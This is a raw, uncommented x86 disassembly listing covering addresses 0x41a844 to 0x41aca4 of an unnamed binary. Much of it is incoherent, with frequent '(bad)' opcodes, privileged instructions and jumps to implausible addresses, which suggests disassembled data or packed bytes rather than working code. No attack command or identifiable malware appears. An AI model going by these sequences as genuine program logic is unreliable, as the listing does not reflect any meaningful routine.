  41a844:	mov    ebp,esp
  41a846:	lock inc DWORD PTR [ecx-0x75]
  41a84a:	mov    esp,esp
  41a84c:	fadd   DWORD PTR [eax]
  41a84e:	rol    edi,0xee
  41a851:	test   BYTE PTR [eax],al
  41a853:	dec    esp
  41a854:	push   0x32
  41a856:	dec    DWORD PTR [ebx-0x30ba0314]
  41a85c:	push   eax
  41a85d:	mov    dh,0x21
  41a85f:	add    edi,edi
  41a861:	cmp    edi,DWORD PTR [eax-0x7877af1]
  41a867:	add    BYTE PTR [ebp-0x75],al
  41a86a:	(bad)  
  41a86b:	loopne 0x41a839
  41a86d:	add    BYTE PTR [ebp+0x4584f8c7],al
  41a873:	dec    esp
  41a874:	xor    esi,DWORD PTR [edx]
  41a876:	pushf  
  41a877:	mov    eax,edi
  41a879:	cld    
  41a87a:	(bad)  
  41a87b:	iret   
  41a87c:	test   DWORD PTR [esi+0x3b4d03f8],esi
  41a882:	mov    DWORD PTR [edi],ecx
  41a884:	in     al,0x58
  41a886:	dec    ebp
  41a887:	add    BYTE PTR [ecx+0x4df0e08b],cl
  41a88d:	add    BYTE PTR [ecx+0x4d84f0c7],cl
  41a893:	dec    esp
  41a894:	mov    DWORD PTR [edx],esi
  41a896:	fmul   QWORD PTR [ebx-0x30cc03b3]
  41a89c:	add    esi,DWORD PTR [esi+0x3bd80389]
  41a8a2:	test   DWORD PTR [edi],0x3d3800
  41a8a8:	test   DWORD PTR [ebx+0x84dcf8],ecx
  41a8ae:	add    edi,eax
  41a8b0:	add    BYTE PTR [ebp+ecx*2-0x74cdccb4],al
  41a8b7:	mov    eax,DWORD PTR [ebx]
  41a8b9:	cld    
  41a8ba:	mov    edi,ecx
  41a8bc:	hlt    
  41a8bd:	mov    dh,0x45
  41a8bf:	add    esi,DWORD PTR [ebx]
  41a8c1:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  41a8c7:	add    BYTE PTR [eax],al
  41a8c9:	mov    eax,DWORD PTR [ebp-0x20]
  41a8cc:	mov    eax,DWORD PTR [eax]
  41a8ce:	call   0x33c5f69a
  41a8d3:	dec    esp
  41a8d4:	add    esi,DWORD PTR [edx]
  41a8d6:	cmp    ecx,DWORD PTR [ebx+0x98be475]
  41a8dc:	cld    
  41a8dd:	iret   
  41a8de:	(bad)  
  41a8df:	mov    ebx,es
  41a8e1:	dec    esp
  41a8e2:	push   0x32
  41a8e4:	lea    esi,[edx]
  41a8e6:	mov    al,0x8b
  41a8e8:	call   0xff4ba3dd
  41a8ed:	iret   
  41a8ee:	inc    ebp
  41a8ef:	mov    WORD PTR [ebx-0x75cdccb4],cs
  41a8f5:	or     al,BYTE PTR ds:0xe4728b
  41a8fb:	or     DWORD PTR [ebp-0x31],ecx
  41a8fe:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb0]
  41a905:	cmp    al,cl
  41a907:	je     0x41aae1
  41a90d:	mov    eax,DWORD PTR [ebp-0x10]
  41a910:	mov    eax,DWORD PTR [eax]
  41a912:	xor    eax,edi
  41a914:	mov    al,BYTE PTR [ebp+eax*1+0x32724c]
  41a91b:	mov    ecx,DWORD PTR [ebp-0x20]
  41a91e:	xor    ecx,DWORD PTR [ecx]
  41a920:	bswap  edi
  41a922:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb4],0x32
  41a92a:	add    DWORD PTR [ebx+0x945dc00],ecx
  41a930:	mov    ecx,edi
  41a932:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  41a939:	or     al,BYTE PTR [eax]
  41a93b:	mov    ecx,DWORD PTR [ebp-0x20]
  41a93e:	xor    ecx,DWORD PTR [ecx]
  41a940:	bswap  edi
  41a942:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb0],0x3a
  41a94a:	add    DWORD PTR [edi],ecx
  41a94c:	add    BYTE PTR [eax-0x7474ffbb],dl
  41a952:	xor    ebx,esp
  41a954:	mov    al,BYTE PTR [eax]
  41a956:	add    eax,0x8472c7
  41a95b:	dec    esp
  41a95c:	dec    ebp
  41a95d:	xor    dh,BYTE PTR [ebx]
  41a95f:	mov    ecx,DWORD PTR [edi]
  41a961:	lock ror BYTE PTR [ecx],0xcb
  41a965:	iret   
  41a966:	ror    DWORD PTR [esp+eax*4+0x32014c],0x32
  41a96e:	inc    ebp
  41a96f:	mov    ecx,DWORD PTR [ebx-0x75f6cc1c]
  41a975:	iret   
  41a976:	add    eax,0x4c728c
  41a97b:	xor    cl,BYTE PTR [ebp+0xa]
  41a97e:	mov    ecx,DWORD PTR [ebx+0x98af033]
  41a984:	or     eax,0x8c72cf
  41a989:	push   eax
  41a98a:	shl    DWORD PTR [edx],0x4d
  41a98d:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  41a993:	fmul   QWORD PTR ds:0xc77200
  41a999:	test   cl,al
  41a99b:	dec    esp
  41a99c:	dec    ebp
  41a99d:	xor    cl,BYTE PTR [ebx-0x751bcc75]
  41a9a3:	or     DWORD PTR ds:0x8c72cf,ecx
  41a9a9:	dec    esp
  41a9aa:	enter  0x8532,0x32
  41a9ae:	add    BYTE PTR [ebx+0x945e000],cl
  41a9b4:	mov    ecx,edi
  41a9b6:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  41a9bd:	or     al,BYTE PTR [eax]
  41a9bf:	mov    ecx,DWORD PTR [ebp-0x24]
  41a9c2:	mov    ecx,DWORD PTR [ecx]
  41a9c4:	xor    ecx,edi
  41a9c6:	mov    cl,BYTE PTR [ebp+ecx*1+0x327250]
  41a9cd:	cmp    al,cl
  41a9cf:	jne    0x41aa1e
  41a9d1:	lea    ecx,[ebx-0x7517cc50]
  41a9d7:	sti    
  41a9d8:	or     eax,0x4d72ff
  41a9dd:	cmp    eax,ecx
  41a9df:	je     0x41aa2e
  41a9e1:	mov    ecx,DWORD PTR [ebx-0x7538cc04]
  41a9e7:	ret    
  41a9e8:	or     eax,0x8b7245
  41a9ed:	call   0x84c771ba
  41a9f2:	add    BYTE PTR [eax+eax*1-0x74ccbace],bl
  41a9f9:	mov    esi,DWORD PTR [ebx]
  41a9fb:	cld    
  41a9fc:	mov    dl,BYTE PTR [ebp+0x5]
  41a9ff:	xor    esi,DWORD PTR [edx+0x3]
  41aa02:	add    BYTE PTR [ebx],bh
  41aa04:	dec    ebp
  41aa05:	jnp    0x8b40de02
  41aa0b:	mov    ecx,DWORD PTR ds:0x4d72fc
  41aa11:	xor    eax,ecx
  41aa13:	add    ecx,DWORD PTR [ebp+0x3b]
  41aa16:	mov    esi,DWORD PTR [ebp+0x33]
  41aa19:	mov    ecx,DWORD PTR [edx+0x724d0de8]
  41aa1f:	xor    eax,DWORD PTR [eax]
  41aa21:	(bad)  
  41aa22:	ror    DWORD PTR [eax],0x4d
  41aa25:	jb     0x41a9b2
  41aa27:	add    BYTE PTR [ebx],dh
  41aa29:	ja     0x41a9b5
  41aa2b:	sbb    BYTE PTR ds:0x8d7275,cl
  41aa31:	cwde   
  41aa32:	enter  0x50e8,0xf3
  41aa36:	inc    ebp
  41aa37:	dec    DWORD PTR [ebx-0x7574ccbb]
  41aa3d:	fadd   DWORD PTR ds:0xc372c7
  41aa43:	ror    DWORD PTR [ebp+0x13],0x8b
  41aa47:	inc    ebp
  41aa48:	xor    esi,DWORD PTR [ebx]
  41aa4a:	mov    al,BYTE PTR [ebx]
  41aa4c:	or     eax,0x187250
  41aa51:	inc    ebp
  41aa52:	rcl    DWORD PTR [eax+0x4d],0xdc
  41aa56:	mov    edi,edi
  41aa58:	xor    ecx,DWORD PTR [ebx-0x3ff21376]
  41aa5e:	jb     0x41a9e9
  41aa60:	add    ah,bl
  41aa62:	shl    DWORD PTR [ebp+0x4d],0xff
  41aa66:	mov    ebx,esp
  41aa68:	xor    eax,DWORD PTR [ebp-0x76]
  41aa6b:	add    ecx,DWORD PTR ds:0xe87208
  41aa71:	repz enter 0x10ff,0x45
  41aa76:	inc    ebp
  41aa77:	mov    edx,DWORD PTR [eax-0x28]
  41aa7a:	xor    bh,al
  41aa7c:	inc    ebx
  41aa7e:	mov    eax,ecx
  41aa80:	mov    eax,0xa00c111
  41aa85:	jne    0x41aacc
  41aa87:	mov    esi,DWORD PTR [ebx]
  41aa89:	test   al,0x3
  41aa8b:	inc    ebp
  41aa8c:	mov    DWORD PTR [eax-0xc],edx
  41aa8f:	mov    ds:0x8b33ff45,al
  41aa94:	lea    edx,[eax]
  41aa96:	xor    BYTE PTR [ebp+0x72],cl
  41aa99:	add    DWORD PTR [eax],eax
  41aa9b:	mov    eax,edi
  41aa9d:	lods   al,BYTE PTR ds:[esi]
  41aa9e:	dec    ebp
  41aa9f:	inc    ebp
  41aaa0:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  41aaa6:	retf   
  41aaa7:	mov    edx,ecx
  41aaa9:	adc    al,0x84
  41aaab:	(bad)  
  41aaac:	std    
  41aaad:	ret    
  41aaae:	jmp    FWORD PTR [edi-0x37474bb]
  41aab4:	hlt    
  41aab5:	push   ebp
  41aab6:	(bad)  
  41aab7:	xor    eax,ebx
  41aab9:	(bad)  
  41aaba:	enter  0x1111,0x72
  41aabe:	inc    ebp
  41aabf:	add    BYTE PTR [ebx-0x387deb3f],cl
  41aac5:	cld    
  41aac6:	test   bh,bh
  41aac8:	pushf  
  41aac9:	inc    ebp
  41aaca:	xor    bl,BYTE PTR [edi-0x15]
  41aacd:	pop    ebx
  41aace:	push   0xffffffc2
  41aad0:	inc    DWORD PTR [eax]
  41aad2:	in     al,dx
  41aad3:	mov    eax,DWORD PTR [ebp+0x51]
  41aad6:	push   eax
  41aad7:	inc    ebp
  41aad8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aad9:	mov    edi,edi
  41aadb:	or     BYTE PTR [ebx+0x4d80fc16],cl
  41aae1:	add    DWORD PTR [ebx],esi
  41aae3:	add    BYTE PTR [ebx],al
  41aae5:	add    BYTE PTR [ebx],bh
  41aae7:	icebp  
  41aae8:	je     0x41aaf2
  41aaea:	mov    eax,DWORD PTR [edi]
  41aaec:	cld    
  41aaed:	rol    edi,0x72
  41aaf0:	ret    
  41aaf1:	add    BYTE PTR [edx-0x2f],ch
  41aaf4:	lea    edx,[eax]
  41aaf6:	cwde   
  41aaf7:	jne    0x41aae1
  41aaf9:	(bad)  
  41aafa:	clc    
  41aafb:	or     al,0xff
  41aafd:	inc    DWORD PTR [ebp-0x18]
  41ab00:	cmp    ebx,0x18
  41ab03:	inc    DWORD PTR [ebp+0x6]
  41ab06:	call   FWORD PTR [ebp-0x54]
  41ab09:	or     al,0x75
  41ab0b:	push   ebp
  41ab0c:	mov    ebp,esp
  41ab0e:	test   al,0x53
  41ab10:	inc    ebp
  41ab11:	mov    edx,DWORD PTR [eax-0x75]
  41ab14:	imul   ecx,DWORD PTR [eax],0xffffffff
  41ab17:	dec    ebp
  41ab18:	mov    edx,DWORD PTR [edi-0x4]
  41ab1b:	push   ebp
  41ab1c:	dec    ebp
  41ab1d:	push   ecx
  41ab1e:	xor    esi,DWORD PTR [ebx]
  41ab20:	add    edi,DWORD PTR [edi+0x74723b]
  41ab26:	push   0xffffffc7
  41ab28:	inc    DWORD PTR [ecx]
  41ab2a:	lods   al,BYTE PTR ds:[esi]
  41ab2b:	inc    ebp
  41ab2c:	inc    ebp
  41ab2d:	mov    eax,DWORD PTR [ebx]
  41ab2f:	xchg   esp,eax
  41ab30:	or     BYTE PTR [eax],al
  41ab32:	call   0xffcda3c2
  41ab37:	adc    al,0x45
  41ab39:	or     BYTE PTR [ebx+0x800ac01],0x0
  41ab40:	inc    ebp
  41ab41:	inc    ecx
  41ab42:	add    ecx,DWORD PTR [ebx-0x76baebec]
  41ab48:	mov    eax,DWORD PTR [ecx]
  41ab4a:	call   0x338af84f
  41ab4f:	push   0x3
  41ab51:	push   0xc1300f
  41ab56:	dec    ebp
  41ab57:	jo     0x41aae4
  41ab59:	push   0xffffffd4
  41ab5b:	dec    edi
  41ab5d:	mov    DWORD PTR [ebx+ecx*4-0x3ccdf764],ecx
  41ab64:	cmp    eax,edi
  41ab66:	cmovne edx,DWORD PTR [edi-0x75]
  41ab6a:	call   DWORD PTR [eax]
  41ab6c:	mov    eax,DWORD PTR [ebp+0x8]
  41ab6f:	call   FWORD PTR [esi+0x14]
  41ab72:	leave  
  41ab73:	inc    ebp
  41ab74:	adc    BYTE PTR [eax+0x55],dl
  41ab77:	jne    0x41ab65
  41ab79:	call   0xff52ab09
  41ab7e:	dec    ebp
  41ab7f:	inc    ebp
  41ab80:	mov    ecx,DWORD PTR [ebx+0x390338b]
  41ab86:	add    BYTE PTR [ebx],bh
  41ab88:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  41ab8c:	push   ebp
  41ab8d:	or     al,0x51
  41ab8f:	dec    ebp
  41ab90:	xor    DWORD PTR [ebx],0xf32039c
  41ab96:	cmp    eax,DWORD PTR [ebp+0x74]
  41ab99:	mov    edi,edi
  41ab9b:	pop    edi
  41ab9c:	adc    BYTE PTR [ebx+0x75],bl
  41ab9f:	ret    0x50
  41aba2:	mov    ecx,DWORD PTR ss:[edx-0x7d]
  41aba6:	(bad)  
  41aba7:	clc    
  41aba8:	mov    esp,ebp
  41abaa:	pop    ecx
  41abab:	mov    ecx,0xf80085c2
  41abb0:	mov    ecx,DWORD PTR [ecx+edx*2]
  41abb3:	push   esi
  41abb4:	push   esi
  41abb5:	(bad)  
  41abb6:	lock inc DWORD PTR [ebp+0x44]
  41abba:	mov    edx,DWORD PTR [eax]
  41abbc:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  41abc0:	or     BYTE PTR [ebp+0x7],dl
  41abc3:	push   ecx
  41abc4:	ret    
  41abc5:	xor    ebx,DWORD PTR [esi+edi*4+0x37232]
  41abcc:	mov    esi,edi
  41abce:	mov    edi,DWORD PTR [esp+edx*1+0xc]
  41abd2:	cmp    BYTE PTR [ebp+0x1],0x89
  41abd6:	add    BYTE PTR [eax+ecx*1],ah
  41abd9:	cmp    DWORD PTR [ebp+0x10],eax
  41abdc:	mov    edx,DWORD PTR [esi]
  41abde:	xchg   esp,eax
  41abdf:	dec    esp
  41abe0:	add    BYTE PTR [eax],dl
  41abe2:	mov    ecx,edx
  41abe4:	add    edx,DWORD PTR [esp+edi*1+0x8]
  41abe8:	dec    ebp
  41abe9:	into   
  41abea:	mov    ebp,DWORD PTR [edi+0x240089d8]
  41abf0:	mov    edx,DWORD PTR [eax+0x14]
  41abf3:	das    
  41abf4:	add    al,0x45
  41abf6:	add    BYTE PTR [ebp+0x0],dh
  41abf9:	mov    edi,edi
  41abfb:	and    al,0x50
  41abfd:	mov    eax,DWORD PTR [eax]
  41abff:	and    al,0xd1
  41ac01:	xor    eax,DWORD PTR [esi]
  41ac03:	lea    eax,[ebp+0x8]
  41ac06:	xor    esi,DWORD PTR [edx+0x3]
  41ac09:	add    BYTE PTR [ecx+0x4510fc44],cl
  41ac0f:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  41ac15:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  41ac1f:	xor    bh,bh
  41ac21:	pushf  
  41ac22:	mov    edi,edi
  41ac24:	or     BYTE PTR [esi+ecx*1],cl
  41ac27:	jne    0x41abec
  41ac29:	call   0xaabf5
  41ac2e:	adc    BYTE PTR [ebp+eax*2+0xc],al
  41ac32:	mov    ebx,DWORD PTR [eax]
  41ac34:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  41ac38:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  41ac40:	pop    esi
  41ac41:	dec    ecx
  41ac43:	and    al,0x10
  41ac45:	call   DWORD PTR [ebp+0x24]
  41ac48:	in     al,dx
  41ac49:	call   0xffc5ab32
  41ac4e:	adc    BYTE PTR [ecx+esi*1+0xc],al
  41ac52:	pushf  
  41ac53:	pop    esi
  41ac54:	mov    ebp,esp
  41ac56:	and    al,0xc2
  41ac58:	push   edi
  41ac59:	add    BYTE PTR [ecx+0x33],al
  41ac5c:	mov    DWORD PTR [ebp+0x24],esi
  41ac5f:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  41ac65:	dec    DWORD PTR [eax]
  41ac67:	and    al,0x7
  41ac69:	(bad)  
  41ac6a:	cli    
  41ac6b:	and    al,0x9c
  41ac6d:	or     BYTE PTR [edx],dh
  41ac6f:	sbb    BYTE PTR [ebx],al
  41ac71:	adc    al,0x89
  41ac73:	jmp    DWORD PTR [esp]
  41ac76:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  41ac7c:	adc    al,0x8
  41ac7e:	dec    ebp
  41ac7f:	adc    BYTE PTR [ebp-0x7c],dh
  41ac82:	mov    esi,DWORD PTR [edx]
  41ac84:	and    al,0x24
  41ac86:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  41ac8c:	add    edi,eax
  41ac8e:	pcmpeqb mm1,mm2
  41ac91:	jmp    0x41acdf
  41ac93:	dec    DWORD PTR [eax]
  41ac95:	je     0x41ac82
  41ac97:	mov    edi,DWORD PTR [ecx]
  41ac99:	pop    ebp
  41ac9a:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  41ac9e:	pushf  
  41ac9f:	mov    DWORD PTR [eax-0x8],ebp
  41aca2:	jge    0x41ad0c
  41aca4:	dec    DWORD PTR [ecx+0x5fbf7424]
